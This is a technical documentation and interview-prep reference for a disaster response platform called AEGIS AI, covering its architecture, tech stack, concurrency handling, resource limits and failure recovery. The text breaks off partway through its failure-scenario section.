================================================================================
         DISASTER RESPONSE RESOURCE OPTIMIZATION PLATFORM (AEGIS AI)
                        COMPLETE PROJECT DOCUMENTATION
        >>> INTERVIEW-READY COMPREHENSIVE TECHNICAL REFERENCE v6.0 <<<
================================================================================

================================================================================
                              TABLE OF CONTENTS
================================================================================

1.  PROJECT OVERVIEW
2.  ARCHITECTURE OVERVIEW
3.  TECHNOLOGY STACK
    3.1  Technical Specifications (Network, Ports, Headers)
    3.2  System Design Deep Dive - Why These Choices? [NEW]
    3.3  Concurrency & Race Condition Handling [NEW]
    3.4  Memory Management & Resource Limits [NEW]
    3.5  Algorithm Complexity Analysis [NEW]
    3.6  Error Handling & Failure Recovery [NEW]
4.  PROJECT STRUCTURE
5.  BACKEND IMPLEMENTATION
    5.1  Server Entry Point
    5.2  Configuration Management
    5.3  Database Models
    5.4  API Routes & Controllers
    5.5  Services Layer
    5.6  Middleware
    5.7  AI Agents System
    5.8  Complete Request Lifecycle - Technical Deep Dive
    5.9  Agent Inter-Process Communication
6.  FRONTEND IMPLEMENTATION
    6.0  Frontend Data Flow Architecture
    6.1  React Application Structure
    6.2  Pages
    6.3  Components
    6.4  Services
    6.5  State Management
    6.6  Internationalization (i18n)
    6.7  Offline Support & PWA
7.  EMERGENCY STATION DEMO
8.  DEPENDENCIES & LIBRARIES
9.  ENVIRONMENT VARIABLES
10. DETAILED DATA FLOW & REQUEST LIFECYCLE
    10.1  SMS Report Flow (Step-by-Step)
    10.2  PWA Photo Report Flow (Step-by-Step)
    10.3  AI Agent Pipeline (Detailed)
    10.4  Volunteer Verification Flow (Detailed)
    10.5  Emergency Dispatch Flow (Detailed)
    10.6  Authentication Flow (Detailed)
    10.7  Offline Sync Flow (Detailed)
    10.8  Mission Management Flow (Detailed)
11. API ENDPOINTS REFERENCE
12. DATABASE SCHEMAS
13. INSTALLATION & SETUP
14-20. [Additional Sections...]
21. INTERVIEW Q&A SECTION [COMPREHENSIVE - 60+ Q&A Pairs]
    21.1  Architecture Questions
    21.2  Backend Questions
    21.3  Frontend Questions
    21.4  Database Questions
    21.5  Real-Time Questions
    21.6  Offline/PWA Questions
    21.7  AI/ML Questions
    21.8  Security Questions
    21.9  Algorithm Questions
    21.10 Testing & Quality Questions
    21.11 Deployment & Scalability Questions
    21.12 Advanced System Design Questions [NEW]
    21.13 Behavioral/Soft Skill Questions [NEW]
    21.14 Node.js Internals - Deep Dive [NEW]
    21.15 MongoDB Internals - Deep Dive [NEW]
    21.16 React Internals - Deep Dive [NEW]
    21.17 HTTP & Networking - Deep Dive [NEW]

================================================================================
                           1. PROJECT OVERVIEW
================================================================================

Project Name: Disaster Response Resource Optimization Platform (AEGIS AI)
Version: 1.0.0
Author: Omkar Kale
Type: Full-Stack Web Application with AI Agents

AEGIS AI is an AI-powered platform designed to optimize disaster response 
operations through intelligent SMS triage, volunteer coordination, resource 
allocation, and emergency station dispatch. The platform combines multiple 
AI agents working in tandem to process incoming disaster reports, classify 
emergencies, assess severity, and automatically route resources.

CORE FEATURES:
---------------
- AI-Powered SMS Triage: Uses Google Gemini AI to automatically categorize
  and prioritize incoming citizen reports via SMS
- Visual Disaster Detection: TensorFlow/Keras model for image-based disaster
  classification (Sentinel Agent)
- Intelligent Severity Assessment: Gemini AI analyzes reports and assigns
  severity scores (Oracle Agent)
- Automated Route Optimization: OSRM-based routing to dispatch emergency
  services (Logistics Agent)
- Emergency Station Dispatch: Automatic alert dispatch to fire, police,
  hospital, and rescue stations
- Volunteer Management: Task assignment and verification workflows
- Real-time Dashboard: Manager dashboard with live map and analytics
- Offline-First Architecture: Works in low-connectivity disaster scenarios
- Multi-language Support: English, Hindi, and Marathi
- Missing Persons Registry: Family reunification module
- Shelter Management: Evacuation center capacity tracking
- Weather Integration: OpenWeatherMap API for weather-aware operations

================================================================================
                        2. ARCHITECTURE OVERVIEW
================================================================================

The platform follows a microservices-inspired architecture with three main
components:

┌─────────────────────────────────────────────────────────────────────────────┐
│                              FRONTEND (React)                                │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │  Dashboard  │  │  Volunteer  │  │  Resources  │  │  Map View   │         │
│  │    Page     │  │    Page     │  │    Page     │  │  (Leaflet)  │         │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                                              │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │              IndexedDB (Dexie) - Offline Storage                     │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           BACKEND (Node.js/Express)                          │
│                                                                              │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
│  │   Routes     │  │  Controllers │  │   Services   │  │  Middleware  │     │
│  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘     │
│                                                                              │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                        AI AGENTS SYSTEM                               │   │
│  │  ┌────────────────┐  ┌─────────────────┐  ┌────────────────────┐     │   │
│  │  │ Sentinel Agent │  │  Oracle Agent   │  │  Logistics Agent   │     │   │
│  │  │  (Python/TF)   │  │   (Node.js)     │  │     (Python)       │     │   │
│  │  │ Image Analysis │  │ Severity Score  │  │  Route Optimization│     │   │
│  │  └────────────────┘  └─────────────────┘  └────────────────────┘     │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                    ┌───────────────┼───────────────┐
                    ▼               ▼               ▼
           ┌───────────────┐ ┌───────────────┐ ┌───────────────┐
           │   MongoDB     │ │  Cloudinary   │ │    Twilio     │
           │   Database    │ │ Image Storage │ │  SMS Gateway  │
           └───────────────┘ └───────────────┘ └───────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                    EMERGENCY STATION DEMO SERVERS                            │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐                     │
│  │ Fire     │  │ Hospital │  │ Police   │  │ Rescue   │                     │
│  │ :4001    │  │ :4002    │  │ :4003    │  │ :4004    │                     │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘                     │
│              Each with real-time Socket.IO dashboard                         │
└─────────────────────────────────────────────────────────────────────────────┘

================================================================================
                          3. TECHNOLOGY STACK
================================================================================

FRONTEND:
---------
- Framework: React 19.1.1
- Build Tool: Vite 7.1.7
- Routing: React Router DOM 7.9.5
- State Management: TanStack React Query 5.90.9
- HTTP Client: Axios 1.13.1
- Maps: Leaflet 1.9.4, React-Leaflet 5.0.0, Leaflet Routing Machine 3.2.12
- Offline DB: Dexie 4.2.1 (IndexedDB wrapper)
- Icons: Lucide React 0.554.0
- i18n: i18next 25.7.3, react-i18next 16.5.0
- QR Code: html5-qrcode 2.3.8, react-qr-code 2.0.18
- Compression: lz-string 1.5.0
- PWA: vite-plugin-pwa 1.1.0

BACKEND:
--------
- Runtime: Node.js (ES Modules)
- Framework: Express 4.18.2
- Database: MongoDB with Mongoose 8.19.2
- Session: express-session 1.18.2 with connect-mongo 6.0.0
- File Upload: Multer 2.0.2
- Cloud Storage: Cloudinary 1.41.3
- SMS: Twilio 5.10.4
- AI: Google Generative AI (@google/generative-ai 0.24.1), OpenAI 6.14.0
- Validation: express-validator 7.3.1
- HTTP Client: node-fetch 3.3.2
- Unique IDs: uuid 13.0.0
- Environment: dotenv 16.3.1

AI AGENTS:
----------
- Python 3.x with TensorFlow/Keras for image classification
- Sentinel Agent: TensorFlow, Keras, Pillow, NumPy, PyMongo, Requests
- Logistics Agent: PyMongo, Requests, python-dotenv
- Oracle Agent: Node.js with Gemini AI integration

STATION DEMO:
-------------
- Express 4.18.2
- Socket.IO 4.7.2 for real-time alerts
- Mongoose 8.0.0
- Axios 1.6.0

DEV TOOLS:
----------
- Nodemon 3.0.1 (hot reload)
- Concurrently 8.2.2 (parallel scripts)
- Cross-env 7.0.3 (environment variables)
- ESLint 9.36.0 with React plugins

================================================================================
                    3.1 TECHNICAL SPECIFICATIONS
================================================================================

NETWORK PROTOCOLS & PORTS:
--------------------------
┌──────────────────────┬────────────┬─────────────────────────────────────────┐
│ Service              │ Port       │ Protocol & Details                      │
├──────────────────────┼────────────┼─────────────────────────────────────────┤
│ Backend API          │ 3000       │ HTTP/1.1, REST JSON API                 │
│ Frontend Dev Server  │ 5173       │ HTTP, Vite HMR (WebSocket)              │
│ Fire Station Demo    │ 4001       │ HTTP + WebSocket (Socket.IO)            │
│ Hospital Station     │ 4002       │ HTTP + WebSocket (Socket.IO)            │
│ Police Station       │ 4003       │ HTTP + WebSocket (Socket.IO)            │
│ Rescue Station       │ 4004       │ HTTP + WebSocket (Socket.IO)            │
│ MongoDB              │ 27017      │ MongoDB Wire Protocol                   │
│ OSRM API             │ 443        │ HTTPS (external: router.project-osrm.org)│
│ Cloudinary API       │ 443        │ HTTPS (external: api.cloudinary.com)   │
│ Twilio API           │ 443        │ HTTPS (external: api.twilio.com)       │
│ Gemini API           │ 443        │ HTTPS (external: generativelanguage)   │
└──────────────────────┴────────────┴─────────────────────────────────────────┘

================================================================================
3.2 SYSTEM DESIGN DEEP DIVE - WHY THESE CHOICES?
================================================================================

This section explains the reasoning behind every major technical decision,
which is exactly what interviewers want to understand.

WHY MONGODB OVER POSTGRESQL?
----------------------------
Decision: MongoDB (Document Database)
Alternative Considered: PostgreSQL (Relational)

Reasons for MongoDB:
1. FLEXIBLE SCHEMA: Disaster reports have varying fields
   - SMS reports: fromNumber, rawMessage, triageData
   - Photo reports: imageUrl, sentinelData, oracleData
   - Audio reports: audioUrl, transcription
   - Schema evolution without migrations

2. GEOSPATIAL SUPPORT: Built-in 2dsphere indexes
   - Find nearest station: $near operator
   - No PostGIS extension needed

3. HORIZONTAL SCALING: Native sharding
   - Shard by location for regional distribution
   - Auto-balancing across shards

4. JSON-NATIVE: Direct mapping to JavaScript objects
   - No ORM impedance mismatch
   - Mongoose provides schema validation when needed

Trade-offs Accepted:
- No ACID transactions across collections (acceptable for this use case)
- No complex JOINs (we use denormalization instead)
- Eventually consistent reads (acceptable with proper read concern)

WHY EXPRESS OVER FASTIFY/NEST.JS?
---------------------------------
Decision: Express.js
Alternatives: Fastify (faster), NestJS (structured)

Reasons for Express:
1. ECOSYSTEM: Largest middleware ecosystem
   - multer for file uploads (well-tested)
   - express-session with connect-mongo
   - passport.js if we add OAuth later

2. SIMPLICITY: Minimal boilerplate
   - Quick prototyping for disaster response
   - Easy to understand for new developers

3. FLEXIBILITY: No opinions on architecture
   - We chose our own service layer pattern
   - Not locked into dependency injection

Why not Fastify (3x faster)?
- Performance difference negligible at our scale (<1000 RPS)
- Express middleware compatibility more important

Why not NestJS?
- Overhead of decorators/DI not justified
- TypeScript would add complexity
- Team familiarity with Express

WHY REACT OVER VUE/SVELTE?
--------------------------
Decision: React 19 with Vite
Alternatives: Vue 3, Svelte, Next.js

Reasons for React:
1. PWA SUPPORT: Excellent with vite-plugin-pwa
   - Service worker generation
   - Workbox integration
   - Offline caching strategies

2. REACT QUERY: Best server state management
   - Stale-while-revalidate pattern
   - Automatic refetching
   - Optimistic updates

3. LEAFLET INTEGRATION: react-leaflet mature
   - Custom markers with React components
   - Event handling with React patterns

Why Vite over Create React App?
- 10-100x faster HMR (Hot Module Replacement)
- ES modules in development
- Better tree shaking in production

WHY SEPARATE PYTHON AGENTS?
---------------------------
Decision: Python agents as child processes
Alternative: Node.js-only with TensorFlow.js

Reasons for Python:
1. TENSORFLOW: Python has first-class TensorFlow support
   - Pre-trained models available
   - Full Keras API
   - GPU acceleration easier

2. ISOLATION: Agent crashes don't affect Express
   - Separate memory space
   - Independent restarts possible
   - No GIL contention with Node.js

3. SCIENTIFIC ECOSYSTEM: NumPy, Pillow, etc.
   - Image preprocessing well-documented
   - Easy to add new ML models

Why not TensorFlow.js?
- Limited model support
- Slower inference on CPU
- Less documentation for production

WHY POLLING OVER MESSAGE QUEUE?
-------------------------------
Decision: MongoDB polling with findOneAndUpdate
Alternative: RabbitMQ/Redis pub-sub

Reasons for Polling:
1. SIMPLICITY: No additional infrastructure
   - MongoDB already required
   - No broker to maintain
   - Easier deployment

2. ATOMIC LOCKING: findOneAndUpdate is perfect
   - No duplicate processing
   - Built-in distributed lock

3. PERSISTENCE: Reports stored anyway
   - No message loss if agent crashes
   - Retry by resetting status

When to switch to RabbitMQ:
- >1000 reports/minute (current: ~10/minute)
- Need for message priorities
- Multiple consumer groups

TRADE-OFFS TABLE:
-----------------
┌─────────────────────┬────────────────────────┬────────────────────────────┐
│ Decision            │ Benefit                │ Trade-off Accepted         │
├─────────────────────┼────────────────────────┼────────────────────────────┤
│ MongoDB             │ Flexible schema        │ No ACID transactions       │
│ Express             │ Simple, ecosystem      │ Slower than Fastify        │
│ React               │ PWA support, React Query│ Learning curve            │
│ Python agents       │ TensorFlow, isolation  │ Cross-language complexity  │
│ Polling             │ Simple, atomic         │ Latency (2-5 sec polling)  │
│ Session auth        │ Simple, stateful       │ Horizontal scaling needs   │
│                     │                        │ MongoDB session store      │
│ OSRM public API     │ Free, no API key       │ Rate limits, no SLA        │
│ Cloudinary          │ CDN, transformations   │ Vendor lock-in, cost       │
└─────────────────────┴────────────────────────┴────────────────────────────┘

================================================================================
3.3 CONCURRENCY & RACE CONDITION HANDLING
================================================================================

This section explains how the system handles concurrent operations safely.

PROBLEM 1: MULTIPLE AGENTS CLAIMING SAME REPORT
-----------------------------------------------
Scenario: Sentinel Agent A and B both poll at the same millisecond

WITHOUT PROTECTION:
  Agent A: finds report with status='Pending'
  Agent B: finds SAME report with status='Pending'
  Agent A: updates status to 'Processing'
  Agent B: updates status to 'Processing'
  Result: BOTH process the same report (duplicate work, data corruption)

SOLUTION: ATOMIC findOneAndUpdate
  
  // This is a SINGLE atomic operation in MongoDB
  db.reports.findOneAndUpdate(
    { status: 'Pending', imageUrl: { $exists: true } },  // Find
    { $set: { status: 'Processing_Visual' } },           // Update
    { returnDocument: 'after' }                          // Return new
  );
  
  // MongoDB guarantees:
  // 1. Document-level lock acquired
  // 2. Query executed
  // 3. Update applied
  // 4. Lock released
  // ALL IN ONE OPERATION

What happens with concurrent agents:
  T=0ms:  Agent A calls findOneAndUpdate
  T=0ms:  Agent B calls findOneAndUpdate
  T=1ms:  MongoDB processes A's request first (queue order)
  T=1ms:  A gets report, status now 'Processing_Visual'
  T=2ms:  MongoDB processes B's request
  T=2ms:  B's query finds NO match (status no longer 'Pending')
  T=2ms:  B receives null, moves on

PROBLEM 2: DUPLICATE EMERGENCY DISPATCHES
-----------------------------------------
Scenario: Volunteer verification triggers dispatch while Logistics Agent also tries

Solution: Status-based idempotency

  // Before dispatch, check current status
  const need = await Need.findOneAndUpdate(
    {
      _id: needId,
      emergencyStatus: { $in: ['none', 'pending'] }  // Only if not dispatched
    },
    {
      $set: { emergencyStatus: 'dispatching' }  // Lock it
    },
    { new: true }
  );
  
  if (!need) {
    console.log('Already dispatched or in progress');
    return;
  }
  
  // Proceed with dispatch...
  await sendAlertToStation(station, alertData);
  
  // Mark complete
  await Need.updateOne(
    { _id: needId },
    { $set: { emergencyStatus: 'dispatched' } }
  );

PROBLEM 3: CONCURRENT SHELTER CHECK-INS
---------------------------------------
Scenario: Two volunteers check in evacuees simultaneously

WRONG APPROACH (Race Condition):
  // Volunteer A reads current=50, adds 10
  const shelter = await Shelter.findById(id);  // current: 50
  shelter.capacity.current = shelter.capacity.current + 10;  // 60
  await shelter.save();
  
  // Volunteer B reads current=50 (before A saved), adds 5
  const shelter = await Shelter.findById(id);  // current: 50 (stale!)
  shelter.capacity.current = shelter.capacity.current + 5;  // 55
  await shelter.save();  // Overwrites A's update!
  
  // Result: current=55 instead of 65 (lost 10 people!)

CORRECT APPROACH (Atomic Increment):
  // Both volunteers use $inc operator
  await Shelter.updateOne(
    { _id: id },
    { $inc: { 'capacity.current': 10 } }  // Atomic add
  );
  
  await Shelter.updateOne(
    { _id: id },
    { $inc: { 'capacity.current': 5 } }  // Atomic add
  );
  
  // MongoDB guarantees correct result: current = 50 + 10 + 5 = 65

PROBLEM 4: SESSION RACE CONDITIONS
----------------------------------
Scenario: User opens two tabs, logs out in one

Express-session handling:
  // Tab A: Makes API request
  // Middleware loads session from MongoDB
  // req.session = { userId: '123', ... }
  
  // Tab B: User clicks logout
  // req.session.destroy() called
  // Session deleted from MongoDB
  
  // Tab A: Request continues with stale session?
  // NO - Session already loaded into memory for this request
  // Next request from Tab A will fail (session not in DB)

Solution: Already handled by express-session's design
  - Session loaded once per request
  - Changes saved at response end
  - Stale session = 401 on next request

PROBLEM 5: OPTIMISTIC UI UPDATE CONFLICTS
-----------------------------------------
Scenario: User edits report while backend updates it

React Query optimistic update with rollback:

  const mutation = useMutation({
    mutationFn: updateReport,
    
    onMutate: async (newData) => {
      // Cancel in-flight fetches
      await queryClient.cancelQueries(['report', id]);
      
      // Snapshot current state
      const previous = queryClient.getQueryData(['report', id]);
      
      // Optimistically update
      queryClient.setQueryData(['report', id], newData);
      
      // Return rollback context
      return { previous };
    },
    
    onError: (err, newData, context) => {
      // Rollback on error
      queryClient.setQueryData(['report', id], context.previous);
      toast.error('Update failed, reverted');
    },
    
    onSettled: () => {
      // Always refetch to ensure consistency
      queryClient.invalidateQueries(['report', id]);
    }
  });

================================================================================
3.4 MEMORY MANAGEMENT & RESOURCE LIMITS
================================================================================

BACKEND MEMORY CONSIDERATIONS:
------------------------------

1. MULTER MEMORY STORAGE:
   // Images stored in RAM until Cloudinary upload
   storage: multer.memoryStorage()
   
   Memory per request: up to 10MB (image) + overhead
   Concurrent uploads: 10 = 100MB RAM
   
   Why not disk storage?
   - Faster (no disk I/O)
   - Simpler cleanup (garbage collected)
   - Temporary anyway (uploaded to Cloudinary)
   
   Risk mitigation:
   - fileSize limit: 10MB
   - Request timeout: 60 seconds
   - Load balancer connection limits

2. MONGOOSE CONNECTION POOLING:
   // Default pool size: 100 connections
   mongoose.connect(uri, { maxPoolSize: 100 });
   
   Each connection: ~1MB RAM
   Max pool memory: ~100MB
   
   Why not fewer connections?
   - Concurrent requests wait for connections
   - Agent processes also need connections
   - Better to have headroom

3. AI AGENT MEMORY:
   Sentinel Agent (Python):
   - TensorFlow model: ~50MB
   - Image processing: ~2MB per image
   - MongoDB driver: ~10MB
   - Total: ~70MB baseline
   
   Oracle Agent (Node.js):
   - Mongoose: ~10MB
   - Gemini SDK: ~5MB
   - Total: ~20MB baseline
   
   Logistics Agent (Python):
   - PyMongo: ~10MB
   - Requests library: ~5MB
   - Total: ~20MB baseline
   
   Combined: ~110MB for all agents

FRONTEND MEMORY CONSIDERATIONS:
-------------------------------

1. REACT QUERY CACHE:
   // Default cache time: 5 minutes
   cacheTime: 5 * 60 * 1000
   
   Cache size depends on data:
   - 100 reports @ 2KB each = 200KB
   - 50 missions @ 10KB each = 500KB
   - Map tiles @ 50KB each = varies
   
   Cache eviction: Automatic LRU

2. INDEXEDDB LIMITS:
   Browser limits:
   - Chrome: ~80% of disk space
   - Firefox: ~50% of disk space
   - Safari: ~1GB (prompts user for more)
   
   Our usage:
   - pendingVerifications: <1MB
   - offlineReports: <10MB
   - mapTiles: Can grow large (monitor)

3. LEAFLET MAP MEMORY:
   Each tile layer: ~50KB per tile
   Visible tiles: ~20-30 at zoom level 15
   Memory: ~1-2MB per tile layer
   
   Optimization: Remove tiles when zooming

HTTP HEADERS CONFIGURATION:
---------------------------
CORS Headers (Development):
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
  Access-Control-Allow-Headers: Content-Type, Authorization, x-auth-pin
  Access-Control-Allow-Credentials: true

CORS Headers (Production):
  Access-Control-Allow-Origin: [whitelist from ALLOWED_ORIGINS env]
  Access-Control-Allow-Credentials: true

Session Cookie Configuration:
  Name: connect.sid
  Secure: false (dev) / true (prod with HTTPS)
  HttpOnly: true
  SameSite: lax
  MaxAge: 86400000 (24 hours in milliseconds)
  Path: /

Content-Type Handling:
  - JSON bodies: application/json (parsed by express.json())
  - Form data: application/x-www-form-urlencoded (express.urlencoded)
  - File uploads: multipart/form-data (parsed by multer)

REQUEST SIZE LIMITS:
--------------------
  - JSON body: 100KB (Express default)
  - URL-encoded: 100KB (Express default)
  - Image upload: 10MB (multer fileSize limit)
  - Audio upload: 25MB (Whisper API limit)
  - Total request timeout: No limit (configured per-route)

MONGODB CONNECTION CONFIGURATION:
---------------------------------
Connection String Format:
  mongodb+srv://<user>:<password>@<cluster>.mongodb.net/<database>
  mongodb://localhost:27017/DisasterResponseDB (local development)

Mongoose Connection Options (default):
  - useNewUrlParser: true (default in Mongoose 6+)
  - useUnifiedTopology: true (default in Mongoose 6+)
  - serverSelectionTimeoutMS: 30000
  - socketTimeoutMS: 0 (no timeout)
  - maxPoolSize: 100 (connection pool)
  - minPoolSize: 0
  - maxIdleTimeMS: 60000

Database Collections:
  - reports: Disaster reports (PWA photos, audio, SMS)
  - needs: Legacy SMS needs (being phased out)
  - users: Volunteers and managers
  - emergencystations: Registered emergency services
  - emergencyalerts: Alert history
  - missions: Dispatch missions with routes
  - shelters: Evacuation centers
  - missingpersons: Family reunification cases
  - roadconditions: Road status reports
  - volunteermessages: Volunteer communications
  - sessions: Express session storage (connect-mongo)

EXTERNAL API RATE LIMITS:
-------------------------
┌──────────────────────┬────────────────────────────────────────────────────┐
│ Service              │ Rate Limits & Quotas                               │
├──────────────────────┼────────────────────────────────────────────────────┤
│ Google Gemini        │ 60 requests/minute (free tier)                     │
│                      │ Model: gemini-2.5-flash                            │
│                      │ Max tokens: 8192 output                            │
├──────────────────────┼────────────────────────────────────────────────────┤
│ OpenAI Whisper       │ 50 requests/minute                                 │
│                      │ Max audio: 25MB file size                          │
│                      │ Model: whisper-1                                   │
├──────────────────────┼────────────────────────────────────────────────────┤
│ OSRM                 │ Public API, fair use policy                        │
│                      │ Timeout: 10 seconds per request                    │
│                      │ Cache: 30 minutes TTL, max 500 entries             │
├──────────────────────┼────────────────────────────────────────────────────┤
│ Cloudinary           │ Free tier: 25K transformations/month               │
│                      │ Upload timeout: 60 seconds                         │
│                      │ Max retries: 3 with exponential backoff            │
├──────────────────────┼────────────────────────────────────────────────────┤
│ Twilio               │ Varies by plan, webhook-based                      │
│                      │ Webhook validation: production only                │
│                      │ Message format: x-www-form-urlencoded              │
├──────────────────────┼────────────────────────────────────────────────────┤
│ OpenWeatherMap       │ 60 calls/minute (free tier)                        │
│                      │ Cache: Results cached client-side                  │
└──────────────────────┴────────────────────────────────────────────────────┘

================================================================================
3.5 ALGORITHM COMPLEXITY ANALYSIS
================================================================================

Every algorithm's time and space complexity - critical for technical interviews.

BACKEND ALGORITHMS:
-------------------

1. NEAREST STATION FINDER
   Location: emergencyAlertService.js
   
   Algorithm: MongoDB $near with 2dsphere index
   
   Time Complexity:
   - Without index: O(n) - scan all stations
   - With 2dsphere index: O(log n) - R-tree traversal
   
   Space Complexity: O(1) - constant result set
   
   Code:
   EmergencyStation.findOne({
     type: missionType,
     available: true,
     location: {
       $near: {
         $geometry: { type: 'Point', coordinates: [lng, lat] },
         $maxDistance: 50000  // 50km radius
       }
     }
   });
   
   How 2dsphere index works:
   - Stores coordinates in S2 cells (Google's spherical geometry library)
   - Hierarchy of cells for efficient range queries
   - Earth curvature accounted for (Haversine distance)

2. REPORT POLLING (Agent Loop)
   Location: sentinel_agent.py, oracle_agent.js
   
   Algorithm: Polling with backoff
   
   Time Complexity per poll:
   - findOneAndUpdate with index: O(log n)
   - Full scan without status index: O(n)
   
   Optimization: Compound index on (status, createdAt)
   
   Polling Interval:
   - Active reports: 2 seconds
   - No reports: Exponential backoff up to 30 seconds
   
   Why not event-driven?
   - Simpler implementation
   - Self-healing (restarts catch up automatically)
   - No message broker dependency

3. ROUTE OPTIMIZATION (OSRM)
   Location: logistics_agent.py
   
   Algorithm: Contraction Hierarchies (OSRM internal)
   
   Time Complexity:
   - Preprocessing: O(n log n) - done once by OSRM
   - Query: O(log n) - binary search on shortcuts
   
   Space Complexity: O(n) - shortcuts stored
   
   OSRM API Response:
   {
     routes: [{
       geometry: 'encoded_polyline',
       legs: [{
         distance: 12500,  // meters
         duration: 840,    // seconds
         steps: [...]
       }]
     }]
   }

4. SMS TEXT PARSING
   Location: utils/textParser.js
   
   Algorithm: Regex-based entity extraction
   
   Time Complexity: O(m) where m = message length
   - Multiple regex passes
   - No backtracking regexes (safe from ReDoS)
   
   Pattern Examples:
   - Location: /\bat\s+([^,]+)/i
   - People count: /(\d+)\s*(?:people|persons|families)/i
   - Urgency keywords: /urgent|emergency|critical/i
   
   ReDoS Prevention:
   - All patterns are linear time
   - No nested quantifiers
   - Bounded repetition

5. GEMINI PROMPT PROCESSING
   Location: services/geminiService.js
   
   Algorithm: LLM token generation (transformer)
   
   Time Complexity: O(sequence_length²) per token (attention)
   - Mitigated by API (not our concern)
   
   Input Token Limit: 8192
   Output Token Limit: 8192
   
   Retry Strategy:
   - Attempt 1: Immediate
   - Attempt 2: 1 second delay
   - Attempt 3: 2 second delay
   - Exponential backoff

FRONTEND ALGORITHMS:
--------------------

1. REPORT FILTERING
   Location: DashboardPage.jsx
   
   Algorithm: In-memory array filter
   
   Time Complexity: O(n) per filter
   
   Code:
   const filteredReports = reports.filter(r => {
     if (severityFilter && r.severity !== severityFilter) return false;
     if (typeFilter && r.type !== typeFilter) return false;
     if (statusFilter && r.status !== statusFilter) return false;
     return true;
   });
   
   Optimization: useMemo to avoid recalculating
   
   Why not server-side filtering?
   - Small dataset (<1000 reports typically)
   - Faster UI response
   - Works offline

2. MAP MARKER CLUSTERING
   Location: Map.jsx with Leaflet.markercluster
   
   Algorithm: Grid-based clustering
   
   Time Complexity: O(n) - single pass
   - Divide map into grid cells
   - Assign markers to cells
   - Merge cells with count > threshold
   
   Space Complexity: O(n) - store all markers
   
   Why clustering?
   - Performance: 1000 markers = 1000 DOM elements (slow)
   - Clustered: ~50 DOM elements (fast)

3. OFFLINE SYNC QUEUE
   Location: services/syncService.js
   
   Algorithm: Queue with retry logic
   
   Time Complexity: O(1) enqueue, O(1) dequeue
   
   Sync Algorithm:
   1. Read pendingVerifications from IndexedDB
   2. For each pending item:
      a. Attempt POST to /api/reports/:id/verify
      b. Success: Remove from IndexedDB
      c. Failure: Increment retryCount, keep in queue
   3. Retry failed items with exponential backoff
   
   Conflict Resolution: Last-write-wins (acceptable for our use case)

4. REACT QUERY CACHE LOOKUP
   Location: Built-in to React Query
   
   Algorithm: Hash map lookup
   
   Time Complexity: O(1) - queryKey is hashed
   
   Cache Key Structure:
   ['reports']              // List query
   ['report', '123']        // Single item query
   ['missions', { status: 'active' }]  // Filtered query

DATA STRUCTURE CHOICES:
-----------------------
┌────────────────────────┬─────────────────┬─────────────────────────────────┐
│ Use Case               │ Data Structure  │ Justification                   │
├────────────────────────┼─────────────────┼─────────────────────────────────┤
│ Session storage        │ MongoDB + Hash  │ Express-session default         │
│ Location indexing      │ R-tree (2dsphere)│ O(log n) range queries         │
│ React state            │ Object/Map      │ O(1) lookup by ID               │
│ Offline queue          │ IndexedDB + Array│ Persistent, ordered            │
│ OSRM route cache       │ Map (LRU)       │ O(1) lookup, bounded size       │
│ Report status          │ Enum (string)   │ Type safety, documentation      │
│ Coordinates            │ Array [lng, lat]│ GeoJSON standard                │
└────────────────────────┴─────────────────┴─────────────────────────────────┘

================================================================================
3.6 ERROR HANDLING & FAILURE RECOVERY
================================================================================

Complete failure scenario analysis - what happens when things go wrong?

FAILURE SCENARIO 1: GEMINI API UNAVAILABLE
------------------------------------------
Detection: API returns 503 or times out

Recovery Steps:
1. Oracle Agent catches exception
2. Logs error with context
3. Report status reset to 'Pending_Oracle' (no change)
4. Agent continues to next report
5. Retry on next polling cycle (2 seconds)
6. After 3 failures: Alert logged, manual review flagged

User Impact: Report processing delayed by 6+ seconds

Code Path:
  oracle_agent.js:
  try {
    const result = await geminiService.assessSeverity(report);
    await Report.updateOne({ _id: id }, { $set: { severity: result } });
  } catch (error) {
    logger.error('Gemini assessment failed', { error, reportId: id });
    // Status unchanged - will be picked up again
  }

FAILURE SCENARIO 2: MONGODB CONNECTION LOST
-------------------------------------------
Detection: MongoNetworkError, MongoServerSelectionError

Backend Behavior:
1. Mongoose buffers commands for 30 seconds (serverSelectionTimeoutMS)
2. If reconnect succeeds: Buffered commands execute
3. If timeout: Request fails with 500 error

Agent Behavior:
1. findOneAndUpdate throws exception
2. Agent sleeps for 10 seconds
3. Retries connection
4. After 5 failures: Agent exits, parent process restarts

Frontend Behavior:
1. React Query request fails
2. Error displayed via toast notification
3. Data cached in IndexedDB if offline mode
4. Automatic retry on reconnection

FAILURE SCENARIO 3: CLOUDINARY UPLOAD FAILS
-------------------------------------------
Detection: Timeout (60s) or API error

Recovery Steps:
1. Upload function throws error
2. Controller catches error
3. Response: 500 with message "Image upload failed"
4. Client receives error
5. User can retry immediately

No Partial State:
- Report NOT created until upload succeeds
- Transaction-like behavior (all or nothing)

Code:
  const uploadFile = async (file) => {
    try {
      return await cloudinary.uploader.upload(file, {
        timeout: 60000,
        retries: 3
      });
    } catch (error) {
      logger.error('Cloudinary upload failed', { error });
      throw new Error('Failed to upload image. Please try again.');
    }
  };

FAILURE SCENARIO 4: EMERGENCY STATION UNREACHABLE
-------------------------------------------------
Detection: HTTP timeout to station webhook

Recovery Steps:
1. emergencyAlertService catches timeout
2. Alert status set to 'failed'
3. Error logged with station ID
4. Manager notified via dashboard
5. Manual intervention required

Fallback Options:
- Secondary station selection
- SMS/phone call escalation (manual)
- Dashboard alert for human operators

FAILURE SCENARIO 5: OSRM ROUTE SERVICE DOWN
-------------------------------------------
